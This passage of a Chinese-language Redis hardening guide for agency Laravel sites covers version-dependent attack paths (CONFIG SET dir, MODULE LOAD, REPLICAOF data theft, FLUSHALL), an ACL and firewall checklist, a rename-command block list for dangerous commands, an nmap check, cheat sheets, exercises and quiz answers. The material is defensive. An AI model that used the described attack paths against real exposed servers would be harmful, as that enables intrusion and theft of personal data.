6) "no"                          # ★★★★ MODULE LOAD 被封
```

| 版本 | `CONFIG SET dir` 攻擊 | `MODULE LOAD` 攻擊 | 常見於 |
| --- | --- | --- | --- |
| Redis ≤ 6.2 | ★★★★★ **可行** | ★★★★★ 可行 | ★★★★ **Ubuntu 22.04（6.0.16）**、老舊自編譯版本 |
| Redis ≥ 7.0 | ★★ 預設被 `enable-protected-configs no` 擋下 | ★★ 被 `enable-module-command no` 擋下 | Ubuntu 24.04（7.0.15） |
| 任何版本，但有人設了 `enable-protected-configs yes` | ★★★★★ 可行 | — | 抄了某些「效能調校」文章 |

> [!danger] ★★★★ 不要因為「我是 Redis 7」就放心
> 這幾個開關只是**提高門檻**，不是防護。未授權連入的攻擊者仍然可以：
> - `FLUSHALL` 清光你的資料（勒索）
> - 讀走所有 session 內容 —— ★★★★★ **裡面有姓名、身分證字號、申辦內容**，
>   在 Redis 中是**明文**，這是個資法上的外洩事件
> - 用 `REPLICAOF` 讓你的 Redis 去同步他的假 master，把你的資料整份搬走
> - 塞滿記憶體造成阻斷服務
>
> ★★★★★ **「連得上」本身就是事故。** 版本新舊只影響嚴重程度，不影響是不是要通報。

★★★ 另一個減損因素：Ubuntu / Debian 的 Redis 以 **`redis` 使用者**執行，
所以它寫不進 `/root/.ssh` 或 `/var/spool/cron/crontabs/root`。
**但 Docker 官方映像預設以 root 執行**，容器內的 root 加上掛載進去的 volume，
就足以完成攻擊鏈。★★★★ **這是「不要用 root 跑 Redis」真正的價值。**

### 防禦清單（逐項給指令）

> [!danger] ★★★★★ 絕對禁止的四件事
> 1. **`bind 0.0.0.0` 或把 `bind` 整行註解掉。** 後果：全網路可存取，
>    你的 session（含個資）與整個 keyspace 對所有人開放。
> 2. **`protected-mode no`。** 這個開關存在的唯一目的就是在你「沒設密碼又沒設 bind」時
>    保護你，關掉它等於主動放棄最後一道安全網。
> 3. **`requirepass` 留空或設短密碼。** Redis 每秒可處理上萬次 `AUTH`，
>    ★★★★ **8 碼密碼在區網內幾分鐘就被暴力破解**。用 `ACL GENPASS` 產生的 64 字元隨機值。
> 4. **應用程式用 default 使用者連線。** default 是 `+@all ~* &*`，
>    網站被打穿之後，攻擊者就直接拿到 `CONFIG SET` 與 `FLUSHALL`。

```bash
# ① 密碼：用 Redis 自己的 CSPRNG，長度 64 字元
redis-cli ACL GENPASS
```

```text
d4f1a9c3e7b208561f0a3c9d2e8b74605a1c3f9d2e7b8016a4c5d6e7f8901234
```

```bash
# ② 設定檔權限：★★★★ 裡面是明文密碼
sudo chmod 640 /etc/redis/redis-*.conf
sudo chown redis:redis /etc/redis/redis-*.conf
stat -c '%a %U:%G %n' /etc/redis/redis-session.conf
```

```text
640 redis:redis /etc/redis/redis-session.conf
```

```bash
# ③ 最小權限的應用帳號（完整說明見實戰範例步驟 ④）
redis-cli ACL SETUSER laravel on '>密碼' '~srv_apply_*' '&srv_apply_*' \
  +@all -@dangerous -@admin +info -flushall -flushdb -swapdb
```

```bash
# ④ 確認 default 使用者沒有 nopass
redis-cli ACL LIST | grep default
```

```text
user default on #d4f1a9...  ~* &* +@all      # ★ 有 #hash = 有設密碼
                                              # ★★★★★ 看到 "nopass" 就是沒密碼
```

```bash
# ⑤ 監聽面與防火牆（語法見 [[090-02-02-guide-防火牆-ufw基礎與實務]]）
#    bind 內網IP + 127.0.0.1、ufw 只放行 web 主機
# ⑥ 跨網段一律走 SSH 隧道（[[020-02-01-05-cmd-SSH-隧道與埠轉發]]）或 tls-port
# ⑦ 危險指令封印（第二道防線，主力還是 ACL）
grep '^rename-command' /etc/redis/redis-session.conf
```

```text
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command KEYS ""
rename-command MODULE ""
```

```bash
# ⑧ 定期從外部驗證（不要相信本機看到的結果）
nmap -Pn -p 6379,6380 192.168.10.30        # ★★★ 依機關規定事前取得書面同意
```

```text
PORT     STATE    SERVICE
6379/tcp filtered redis          # ★★★★ filtered 才是對的
6380/tcp filtered unknown
```

### 個資與稽核面（機關讀者必看）

> [!danger] ★★★★★ Redis 裡面的東西是明文的
> - **session**：Laravel 的 session payload 是序列化後的字串，
>   裡面常有使用者姓名、身分證字號、申辦案件內容 —— **沒有加密**。
>   `redis-cli GET srv_apply_<sessionid>` 直接就讀得出來。
> - **queue payload**：`queues:default` 裡的任務 JSON 同樣是明文，
>   ★★★★ 寄信任務裡有收件人 email、對帳任務裡有帳號。
> - **傳輸**：Redis 協定預設不加密，同網段的封包擷取就看得到全部內容。
>
> 對應處置：
> 1. ★★★★★ **把 Redis 主機視為個資系統**，納入個資盤點清冊與存取控制，
>    不要當成「只是快取，沒有資料」
> 2. 跨網段一律走 TLS（`tls-port`）或 SSH 隧道
> 3. 備份檔（`dump.rdb`、`appendonlydir/`）等同個資檔案，要加密保存
> 4. ★★★ 廢機／換硬碟時，`/var/lib/redis*` 要納入資料銷毀程序
> 5. 稽核軌跡：Redis **沒有指令層級的稽核日誌**（`MONITOR` 會嚴重影響效能，不能常駐）。
>    ★★★★ 能留下的只有 `ACL LOG`（被拒絕的存取）與連線層的 log ——
>    在稽核回覆表上要誠實寫出這個限制，並說明補償措施（防火牆白名單 + 最小權限 ACL）。
>    資料庫層的稽核論述見 [[060-04-01-07-svc-MySQL-安全強化]]，本篇不重複。

★★★ 最後一個常被忽略的點：**`redis-cli -a` 會把密碼寫進 `~/.bash_history`**。

```bash
# ★★★★ 不要這樣
redis-cli -h 192.168.10.30 -a '密碼' PING

# ★★★★ 要這樣
export REDISCLI_AUTH='密碼'
redis-cli -h 192.168.10.30 PING
```

已經打過的話：

```bash
history | grep -n 'redis-cli -a' 
history -d <行號>
history -w
# ★★★★ 而且該密碼要視為已外洩 —— 換掉它
```

---

## 速查表

### 服務與路徑

| 項目 | Ubuntu / Debian | Rocky / AlmaLinux | 星級 |
| --- | --- | --- | --- |
| 套件 | `redis-server` | `redis` | ★★ |
| 服務名 | `redis-server` | **`redis`** | ★★★ |
| 多 instance | `redis-server@<name>` | 自建 unit | ★★★ |
| 設定檔 | `/etc/redis/redis.conf` | `/etc/redis/redis.conf`（RHEL 9） | ★★★ |
| 資料目錄 | `/var/lib/redis` | `/var/lib/redis` | ★★★ |
| 日誌 | `/var/log/redis/redis-server.log` | `/var/log/redis/redis.log` | ★★ |
| 執行身分 | `redis:redis` | `redis:redis` | ★★★★ |

### 一定要檢查的設定項

| 設定項 | 預設值 | 正式環境該設 | 星級 |
| --- | --- | --- | --- |
| `bind` | `127.0.0.1 -::1` | 內網 IP + `127.0.0.1`，★★★★★ **永遠不要 `0.0.0.0`** | ★★★★★ |
| `protected-mode` | `yes` | 保持 `yes` | ★★★★★ |
| `requirepass` | 未設 | ★★★★ 32 字元以上（用 `ACL GENPASS`） | ★★★★★ |
| `maxmemory` | `0`（無限） | 依 instance 規劃，★★★★ 不可留 0 | ★★★★ |
| `maxmemory-policy` | `noeviction` | cache → `allkeys-lru`；session/queue → `noeviction` | ★★★★★ |
| `appendonly` | `no` | session/queue → `yes`；純 cache → `no` | ★★★★★ |
| `appendfsync` | `everysec` | 保持 `everysec` | ★★★★ |
| `save` | `3600 1 300 100 60 10000` | 純 cache 可設 `""` 全關 | ★★★ |
| `stop-writes-on-bgsave-error` | `yes` | 保持 `yes`（改 `no` 只是關掉警報） | ★★★★ |
| `enable-protected-configs` | `no` | ★★★★ 保持 `no` | ★★★★ |
| `enable-module-command` | `no` | ★★★★ 保持 `no` | ★★★★ |
| `acl-pubsub-default` | `resetchannels`（7.0+） | 保持；ACL 使用者要明寫 `&prefix*` | ★★★★ |
| `slowlog-log-slower-than` | `10000`（微秒） | 保持或調到 5000 | ★★ |
| `maxclients` | `10000` | 配合 `LimitNOFILE=65535` | ★★★ |

### 常用指令

| 指令 | 用途 | 星級 |
| --- | --- | --- |
| `redis-cli ping` | 服務活著嗎 | ★★ |
| `redis-cli INFO server \| grep config_file` | ★★★★ 確認真正的設定檔位置 | ★★★★ |
| `redis-cli CONFIG GET <參數>` | 看**執行中**的值（不是檔案裡的） | ★★★★ |
| `redis-cli CONFIG SET <參數> <值>` | 熱套用（★★★ 記得也寫回檔案） | ★★★★ |
| `redis-cli --scan --pattern '<glob>'` | ★★★★ 取代 `KEYS *` 的唯一正解 | ★★★★★ |
| `redis-cli --bigkeys` | 找出佔記憶體的元兇 | ★★★★ |
| `redis-cli --stat` | 事故當下的即時總覽 | ★★★ |
| `redis-cli --latency-history -i 10` | 看延遲有沒有週期性尖峰 | ★★★ |
| `redis-cli SLOWLOG GET 10` | ★★★★ 誰阻塞了 Redis（含來源 IP） | ★★★★ |
| `redis-cli INFO memory` | `used_memory` / `maxmemory` / 碎片率 | ★★★★ |
| `redis-cli INFO stats \| grep evicted` | ★★★★★ session instance 上必須恆為 0 | ★★★★★ |
| `redis-cli INFO persistence` | 存檔有沒有失敗 | ★★★★★ |
| `redis-cli INFO keyspace` | 各 db 的 key 數與有 TTL 的比例 | ★★★ |
| `redis-cli TTL <key>` | `-1` = 沒 TTL；`-2` = 不存在 | ★★★ |
| `redis-cli ACL LIST` / `ACL LOG` | 看使用者權限 / 被拒紀錄 | ★★★★ |
| `redis-cli ACL GENPASS` | 產生 256-bit 隨機密碼 | ★★★★ |
| `redis-cli BGREWRITEAOF` | 重啟前把 AOF 壓實 | ★★★ |

### 判斷準則（一眼看出問題在哪）

| 看到 | 結論 | 星級 |
| --- | --- | --- |
| `ss` 顯示 `0.0.0.0:6379` | ★★★★★ 資安事件，先停服務再說 | ★★★★★ |
| 外部連進來得到 `NOAUTH` | ★★★★ **不是安全** —— 埠是通的，防火牆沒擋 | ★★★★ |
| 外部連進來 timeout（exit 124） | ★ 正確 | ★ |
| `evicted_keys > 0`（session instance） | ★★★★★ policy 設錯，使用者正在被登出 | ★★★★★ |
| `mem_fragmentation_ratio < 1` | ★★★★★ 已在使用 swap | ★★★★★ |
| `rdb_last_bgsave_status:err` | ★★★★★ MISCONF 即將發生，站台快 500 了 | ★★★★★ |
| `INFO keyspace` 的 `expires` ≪ `keys` | ★★★ 大量 key 沒 TTL，`volatile-*` policy 會失效 | ★★★ |
| 命中率 < 80% | ★★★ 快取可能是負資產，回頭看 TTL 與 key 設計 | ★★★ |
| `SLOWLOG` 出現 `KEYS *` | ★★★★ 找那個來源 IP 的人談談，並封印指令 | ★★★★ |
| `CONFIG GET dir` 不是預期路徑 | ★★★★★ 疑似已被入侵，走事件應變 | ★★★★★ |

---

## 練習題

> [!question]- 練習 1：判斷這台 Redis 該怎麼設
> **題目**：某機關的公文系統跑在一台 4 GB RAM 的 VM 上，
> 上面同時有 Nginx、PHP-FPM、Laravel 與 Redis（MySQL 在另一台）。
> Redis 目前是 `apt` 裝完就沒動過。這個站台會用到 session、cache 與 queue。
> 請寫出你要改的設定項與值，並說明每一項的理由。
>
> ---
> **參考解答**
>
> 4 GB 的機器上還要跑 Nginx 與 PHP-FPM，Redis 能用的不多。
> 拆兩個 instance 在這個規模仍然值得（因為 policy 必須不同），但總量要壓小：
>
> | 設定 | session/queue instance (6379) | cache instance (6380) | 理由 |
> | --- | --- | --- | --- |
> | `maxmemory` | `512mb` | `768mb` | 合計 1.25 GB，留 2.75 GB 給 OS + Nginx + PHP-FPM 與 fork 空間 |
> | `maxmemory-policy` | `noeviction` | `allkeys-lru` | ★★★★★ session 與 queue 不能被淘汰 |
> | `appendonly` | `yes` + `everysec` | `no` | ★★★★★ 重啟不能弄丟登入狀態與待處理公文 |
> | `save` | 保留預設 | `""` | 快取不需要存檔，省 fork 與 IO |
> | `bind` | `127.0.0.1` | `127.0.0.1` | ★★★★ **同一台機器，不需要對外**，這是最大的安全紅利 |
> | `requirepass` | 仍然要設 | 仍然要設 | ★★★ 本機還有其他使用者與可能被打穿的 PHP |
>
> 額外三件事：
> 1. `vm.overcommit_memory=1` —— 4 GB 的機器最容易在 fork 時失敗
> 2. `REDIS_PREFIX` 設一個站台專屬值，即使現在只有一個站台
> 3. ★★★ 記憶體這麼緊，`INFO memory` 的 `mem_fragmentation_ratio` 要納入監控，
>    < 1 就代表開始吃 swap

> [!question]- 練習 2：從症狀反推原因
> **題目**：使用者反映「填到一半的線上申辦表單，按送出就跳回登入頁」，
> 一天大約十幾次，沒有固定時間。Nginx 的 access log 只看到正常的 302，
> Laravel 的 `storage/logs/laravel.log` 完全沒有錯誤。
> 請寫出你的排查順序與最可能的原因。
>
> ---
> **參考解答**
>
> 「沒有任何錯誤 log」+「隨機發生」+「表現為登出」= 典型的 **session 被淘汰**。
>
> 排查順序：
>
> ```bash
> # 【1】確認 session 存哪裡
> grep SESSION_DRIVER /var/www/apply/.env          # → redis
>
> # 【2】確認 Redis 的 policy 與淘汰計數（★★★★★ 關鍵一步）
> redis-cli INFO stats | grep evicted_keys
> redis-cli CONFIG GET maxmemory-policy maxmemory
> ```
> ```text
> evicted_keys:41823                # ★★★★★ 有在淘汰
> maxmemory-policy: allkeys-lru     # ★★★★★ 而且是「不分青紅皂白」的那種
> ```
> ```bash
> # 【3】確認 session 與 cache 是不是共用
> redis-cli INFO keyspace
> redis-cli --scan --pattern '*' | head -20        # 看得到 session key 與 cache key 混在一起
>
> # 【4】確認記憶體是不是長期貼著上限
> redis-cli INFO memory | grep -E 'used_memory_human|maxmemory_human'
> ```
>
> **原因**：cache 與 session 共用一個 instance，policy 是 `allkeys-lru`，
> 記憶體滿了之後 Redis 淘汰「最久沒被存取」的 key ——
> 而使用者填表單那幾分鐘正好沒有碰 session，於是被選中。
>
> **處置**：
> 1. 緊急止血：`CONFIG SET maxmemory-policy noeviction`
>    （★★★ 快取會開始拒絕寫入，但總比使用者被登出好；同時準備擴充記憶體）
> 2. 正解：拆成兩個 instance，session 那台 `noeviction`、cache 那台 `allkeys-lru`
> 3. 加監控：session instance 的 `evicted_keys` 只要 > 0 就告警
>
> ★★★ 另外要排除的相似原因：多站共用 Redis 但沒設 `REDIS_PREFIX`，
> 另一個站台跑了 `cache:clear`。用 `--scan` 看前綴就能分辨。

> [!question]- 練習 3：寫一個上線前的把關檢查
> **題目**：你要在 CI/CD 的部署流程裡加一段「Redis 前置檢查」，
> 任何一項不合格就中止部署。請列出你會檢查哪些項目、用什麼指令、
> 以及為什麼選這幾項（不是全部都要查）。
>
> ---
> **參考解答**
>
> 選擇原則：**只查「錯了會造成服務中斷或資安事件、而且部署當下就查得出來」的項目**。
> 效能調校類（碎片率、命中率）不適合當作阻斷條件。
>
> ```bash
> #!/usr/bin/env bash
> set -euo pipefail
> H="${REDIS_HOST:?}"; P="${REDIS_PORT:-6379}"
> fail() { echo "★★★★ 前置檢查失敗：$*" >&2; exit 1; }
>
> # 【1】PHP 擴充有沒有載入（★★★ 最常見的部署後才爆）
> php -m | grep -qx redis || fail "php-redis 擴充未載入"
>
> # 【2】連得上而且密碼正確
> [[ "$(redis-cli --no-auth-warning -h "$H" -p "$P" PING)" == "PONG" ]] || fail "Redis 連線或認證失敗"
>
> # 【3】★★★★★ 未認證必須被拒（防止有人把密碼拿掉）
> REDISCLI_AUTH='' redis-cli --no-auth-warning -h "$H" -p "$P" DBSIZE 2>&1 \
>   | grep -q NOAUTH || fail "Redis 未設密碼！"
>
> # 【4】★★★★ session instance 的 policy 不可以是 allkeys-*
> pol="$(redis-cli --no-auth-warning -h "$H" -p "$P" CONFIG GET maxmemory-policy | sed -n 2p)"
> [[ "$pol" == "noeviction" ]] || fail "session policy 是 $pol，會淘汰使用者 session"
>
> # 【5】★★★★★ 持久化沒壞（避免部署後撞上 MISCONF）
> st="$(redis-cli --no-auth-warning -h "$H" -p "$P" INFO persistence \
>       | grep -m1 rdb_last_bgsave_status | tr -d '\r' | cut -d: -f2)"
> [[ "$st" == "ok" ]] || fail "上一次存檔失敗（$st），部署後可能全站 500"
>
> # 【6】★★★ 記憶體不能已經貼著上限
> used="$(redis-cli --no-auth-warning -h "$H" -p "$P" INFO memory | grep -m1 '^used_memory:' | tr -d '\r' | cut -d: -f2)"
> max="$( redis-cli --no-auth-warning -h "$H" -p "$P" CONFIG GET maxmemory | sed -n 2p)"
> [[ "$max" == "0" ]] && fail "maxmemory 未設定"
> (( used * 100 / max < 90 )) || fail "記憶體已用超過 90%，先擴充再部署"
>
> echo "Redis 前置檢查全部通過"
> ```
>
> **為什麼不查別的**：
> - 命中率、碎片率是「趨勢指標」，單次取樣沒有意義，放進監控而不是部署閘門
> - `bind` 與防火牆屬於組態基準，用每日排程的 `redis-hardening-check.sh` 查，
>   不需要每次部署都查（而且部署帳號通常沒有讀設定檔的權限）
> - ★★★ 部署閘門要**快而且不會誤判**，超過六、七項就會開始有人想繞過它

---

## 小測驗

Q1. 一台 Redis 同時放 cache、session 與 queue，`maxmemory-policy` 設成 `allkeys-lru`。
記憶體滿了之後最可能發生什麼？為什麼 log 裡看不到錯誤？

Q2. 是非題：把 cache 放在 `db1`、session 放在 `db0`，就能避免 cache 把 session 擠掉。

Q3. 這行指令在一台有 200 萬個 key 的正式機上執行，會發生什麼？
```bash
redis-cli KEYS '*'
```

Q4. `redis-cli TTL mykey` 回傳 `-1` 和 `-2` 分別代表什麼？哪一個對「快取類的 key」是警訊？

Q5. 站台突然全部 500，Redis 的錯誤是
`MISCONF Redis is configured to save RDB snapshots but is currently not able to persist to disk`。
請寫出你的前三個檢查指令，以及 `stop-writes-on-bgsave-error no` 為什麼不是解法。

Q6. 選擇題：Redis 預設的 `maxmemory` 是 0（無限）。這個設定在一台同時跑 MySQL 的機器上，
最可能造成的後果是？
(A) Redis 自己當掉　(B) Redis 開始淘汰 key　(C) **MySQL** 被 OOM Killer 殺掉　(D) 系統自動加 swap 就沒事

Q7. 你在 Ubuntu 24.04 上用 `apt` 裝了 Redis，什麼都沒改。有人說「Redis 預設不安全會被挖礦」。
這句話對嗎？真正會出事的三個人為改動是什麼？

Q8. 為什麼從外部主機連你的 Redis 得到 `NOAUTH Authentication required` **不算**安全？
什麼樣的回應才算？

Q9. 你建了一個 ACL 使用者：
```text
ACL SETUSER laravel on >密碼 ~srv_apply_* +@all -@dangerous
```
上線後 Horizon 的儀表板全是空的、broadcasting 也沒作用。請說出兩個原因與修法。

Q10. 一台機關的 Redis 只放純快取，維運為了省 IO 設了 `save ""` 與 `appendonly no`。
三個月後某次 `apt upgrade` 重啟了服務，隔天民眾陳情「線上申辦送出後沒有下文」。
請說明發生了什麼，以及事前該怎麼避免。

> [!question]- 測驗答案
>
> **Q1.** ★★★★★ **使用者會開始隨機被登出，而且所有 log 都沒有錯誤。**
> `allkeys-lru` 的語意是「記憶體滿了就淘汰最久沒被存取的 key，**不管它是什麼**」。
> Redis 不知道哪個 key 是 session、哪個是快取 —— 對它來說都只是字串。
> 十分鐘沒動作的使用者，他的 session key 正好是「最久沒被存取」的候選人，於是被丟掉。
> 更嚴重的是 `queues:default` 也可能被淘汰，造成任務永久消失。
> 之所以沒有錯誤 log，是因為對應用程式來說
> 「session 不存在」與「使用者本來就沒登入」是**完全相同的狀態** ——
> Laravel 只會把人導向登入頁，這在它眼中是正常流程。
> 判斷方式：`redis-cli INFO stats | grep evicted_keys`，session instance 上這個數字
> **必須恆為 0**。詳見〈★★★★★ cache 與 session 混在同一個 instance 的災難〉。
>
> **Q2.** ★★★★★ **錯。** 這是本篇最常見的誤解。
> `SELECT 1` 只是換一個 key 的 namespace，而
> **`maxmemory`、`maxmemory-policy`、記憶體池、RDB／AOF 設定、重啟行為全部是 instance 層級、跨 db 共用的**。
> `allkeys-lru` 在挑淘汰對象時**會跨所有 database 挑**，db0 的 session 一樣會被丟。
> 分 db 唯一解決的是「誤操作」：在 db1 打 `FLUSHDB` 不會影響 db0。
> 正解是**分 instance**（不同 port、不同設定檔、不同 `maxmemory` 與 policy），
> 做法見〈建立第二個 Redis instance〉與實戰範例步驟 ②～③。
>
> **Q3.** ★★★★★ **整個網站會卡住數秒，然後開始回 502。**
> Redis 的指令執行是單執行緒的，`KEYS` 是 O(N) 而且**掃完整個 keyspace 才回應**。
> 200 萬個 key 大約要好幾秒，這段期間**其他所有連線全部排隊**：
> PHP-FPM 的 worker 一個接一個卡在 Redis 上 → `pm.max_children` 用完 →
> Nginx 沒有可用的 upstream worker → 回 502。
> 事後在 `SLOWLOG GET 10` 裡看得到這筆（含耗時與**來源 IP**）。
> 正確做法是 `redis-cli --scan --pattern '<glob>'`，它用 `SCAN` 分批取、不阻塞。
> 防呆做法是用 `rename-command KEYS ""` 或 ACL 的 `-@dangerous` 直接封掉。
> 詳見〈★★★★ 正式環境絕對不要打 `KEYS *`〉。
>
> **Q4.** `-1` = ★★★ **key 存在，但沒有設過期時間**；`-2` = key 不存在（已過期或被淘汰）。
> **對快取類的 key 來說，`-1` 是警訊** —— 沒有 TTL 的快取永遠不會自己消失，
> 就是純粹的記憶體漏水，會一路把 `maxmemory` 撐滿。
> 而且它會讓 `volatile-lru` 這類 policy 失效（那些 policy 只淘汰有 TTL 的 key，
> 找不到對象時行為退化成 `noeviction`，開始拒絕寫入）。
> 全域判斷用 `redis-cli INFO keyspace`：如果 `expires` 遠小於 `keys`，
> 就代表大量 key 沒有 TTL。反過來說，session 與 queue 的 key 沒有 TTL 是正常的
> （queue 本來就不該有），所以要**分 instance 看，不要混在一起看**。
>
> **Q5.** 前三個檢查指令：
> ```bash
> df -h /var/lib/redis                          # 【1】磁碟滿了嗎（最常見）
> sudo ls -ld /var/lib/redis                    # 【2】擁有者是不是 redis:redis
> redis-cli INFO persistence | grep bgsave_status  # 【3】確認 rdb_last_bgsave_status
> ```
> 成因是 `bgsave` 失敗（磁碟滿、目錄權限錯、或 `vm.overcommit_memory` 未設導致 fork 被拒），
> 而 `stop-writes-on-bgsave-error yes`（預設）讓 Redis **拒絕所有寫入指令**保護資料。
> ★★★★ `CONFIG SET stop-writes-on-bgsave-error no` **只是把警報關掉**：
> 站台會立刻恢復，但 Redis 從此**寫不進磁碟而且不告訴你** ——
> 一旦重啟，這段期間的所有資料（含 session 與 queue）全部消失。
> 它只能當作「先讓服務活過來」的臨時手段，根因沒解決前不能結案。
> 詳見〈常見錯誤與排錯〉第一列與排查步驟【5】【6】。
>
> **Q6.** ★★★★ 正解是 **(C)**。
> `maxmemory 0` 代表 Redis 不自我約束，會一路吃到主機記憶體耗盡。
> 這時 Linux 的 OOM Killer 出手，而它依 `oom_score` 挑犧牲者 ——
> 分數主要看**目前佔用的記憶體**。一台同時跑 MySQL 與 Redis 的機器上，
> MySQL 的 InnoDB buffer pool 通常比 Redis 大，**於是被殺的是 MySQL**。
> 排錯的人跑去查資料庫，查半天查不出來，因為兇手在隔壁。
> 關鍵證據是 `dmesg -T | grep -i 'killed process'`。
> (B) 錯在預設 policy 是 `noeviction`，而且 `maxmemory 0` 時根本不會觸發淘汰邏輯。
> 詳見〈★★★★ maxmemory：不設的後果比你想的嚴重〉。
>
> **Q7.** ★★★★ **這句話不對** —— `apt` 裝出來的 Redis 6+ 預設是
> `bind 127.0.0.1 -::1` 加 `protected-mode yes`，**原廠設定是安全的**。
> 真正會出事的三個人為改動：
> 1. ★★★★★ 把 `bind` 改成 `0.0.0.0` 或整行註解掉（通常是為了讓另一台 web 連進來）
> 2. ★★★★★ `protected-mode no`（錯誤訊息 `DENIED Redis is running in protected mode`
>    裡就寫了怎麼關，很多人照做）
> 3. ★★★★★ Docker 用 `-p 6379:6379` 起 Redis —— 這會插入 DNAT 規則到 ufw 之前，
>    **主機防火牆看起來有擋、實際上沒擋**。用 `-p 127.0.0.1:6379:6379` 或不對外開 port。
> 詳見〈★★★★★ 誠實的起點〉與 Docker 那個 danger 方塊。
>
> **Q8.** ★★★★ `NOAUTH` 代表 **TCP 三次握手成功、Redis 願意跟你講話**，
> 只是要求你先認證。也就是說：**防火牆完全沒有擋住這個埠**。
> 攻擊者從這裡可以做的事包括：以每秒上萬次的速度暴力猜密碼
> （★★★★ Redis 的 `AUTH` 極快，8 碼密碼幾分鐘就破）、
> 用大量連線把 `maxclients` 吃光造成阻斷服務、
> 以及在密碼一旦外洩時立刻取得完整存取。
> **正確的回應只有兩種**：timeout（`timeout 5 redis-cli ... PING` 的 `exit=124`，
> 代表防火牆 DROP），或連線被拒（REJECT）。
> 驗證一定要**從外部主機做**，本機看到的 `bind` 值不能代表實際可達性
> —— Docker 的 DNAT 就是最好的反例。
>
> **Q9.** 兩個原因，都很難從錯誤訊息看出來（症狀是「安靜地不動作」）：
> 1. ★★★★ **`INFO` 屬於 `@dangerous` 類別**，被 `-@dangerous` 一起拿掉了。
>    Horizon 儀表板要靠 `INFO` 取得記憶體與連線統計，拿不到就整片空白。
>    修法：把 `+info` 單獨加回來。
> 2. ★★★★ **Redis 7 起 `acl-pubsub-default` 預設是 `resetchannels`**，
>    新使用者**一個 Pub/Sub 頻道都不能用**。broadcasting 與 Horizon 的事件都走 Pub/Sub，
>    於是靜默失效。修法：加上 `&srv_apply_*`（或 `allchannels`，但範圍太大）。
>
> 修正後的完整指令：
> ```bash
> redis-cli ACL SETUSER laravel on '>密碼' '~srv_apply_*' '&srv_apply_*' \
>   +@all -@dangerous -@admin +info +client\|setname -flushall -flushdb -swapdb
> ```
> ★★★★★ 另外補一個容易漏的點：**`~pattern` 擋不住 `FLUSHALL` / `FLUSHDB` / `SWAPDB`**，
> 因為這三個指令不接受 key 參數，不受 key pattern 限制，必須逐一 `-` 掉。
> 詳見實戰範例步驟 ④ 的逐段解釋表。
>
> **Q10.** ★★★★★ 發生的事：這台 Redis 雖然被當成「純快取」，
> 但站台的 `SESSION_DRIVER=redis` 與 `QUEUE_CONNECTION=redis` 讓它同時裝著
> session 與**待處理的申辦任務**。`save ""` + `appendonly no` 代表**完全沒有持久化**，
> 於是 `apt upgrade` 觸發的那次重啟把記憶體清空：
> - 所有登入使用者被登出（當下正在填表的人資料消失）
> - ★★★★★ `queues:default` 裡尚未被 worker 處理的任務**永久消失** ——
>   民眾在畫面上看到「送出成功」，但案件從來沒有進到下一關，
>   而且**系統不會產生任何錯誤紀錄**，所以沒人發現，直到民眾陳情。
>
> 事前該做的三件事：
> 1. ★★★★★ 先問「這台上面到底有什麼」而不是「它叫什麼名字」——
>    只要有 session 或 queue，就**必須開 AOF（`appendonly yes` + `everysec`）**
> 2. ★★★★ 真的要純快取，就**把 cache 拆到獨立 instance**（不同 port、不持久化），
>    session/queue 留在另一台開 AOF
> 3. ★★★ 重啟前照〈重啟前的正確流程〉檢查 `LLEN queues:default` 是不是 0；
>    並把 `redis-server` 加入不自動重啟的套件清單，或至少讓升級走人工變更流程
>
> 詳見〈決策表：這台 Redis 到底要開什麼〉與該段的 danger 方塊。

---

## 延伸閱讀

- [[130-01-04-04-guide-Laravel-快取最佳化與部署流程]] —— 應用層怎麼用快取（`Cache::remember()`、標籤、
  `cache:clear` vs `config:cache`）。本篇講「Redis 這一側會發生什麼」，那篇講「程式怎麼寫」
- [[130-01-04-03-guide-Laravel-佇列排程與Supervisor]] —— `queues:default` 一直變長時，
  worker 與 Supervisor 該怎麼調；本篇只負責告訴你它會吃掉 `maxmemory`
- [[130-01-05-04-guide-認證串接-Sanctum與JWT]] —— session 與 token 的差別、多台 web 為什麼需要共用 session store
- [[020-01-26-guide-Linux-核心模組與sysctl調校]] —— `vm.overcommit_memory`、`somaxconn`、THP 的完整機制與其他調校項目
- [[090-02-02-guide-防火牆-ufw基礎與實務]] —— 本篇的 ufw 白名單規則語法與規則順序
- [[090-07-04-guide-資安實踐-資安事件應變流程]] —— 發現挖礦跡證之後的保全、通報與重建程序
- [[060-01-06-03-guide-傳輸-備份策略與還原演練]] —— 把 `/var/lib/redis*` 納入備份排程，以及還原演練怎麼做
- [[060-04-01-07-svc-MySQL-安全強化]] —— 同一台機器上另一個資料服務的加固思路，可對照閱讀
- Redis 官方安全指引：<https://redis.io/docs/latest/operate/oss_and_stack/management/security/>
- Redis ACL 完整規則：<https://redis.io/docs/latest/operate/oss_and_stack/management/security/acl/>
- Redis 持久化（RDB / AOF）官方說明：<https://redis.io/docs/latest/operate/oss_and_stack/management/persistence/>
- Key eviction（八種 maxmemory-policy）：<https://redis.io/docs/latest/develop/reference/eviction/>
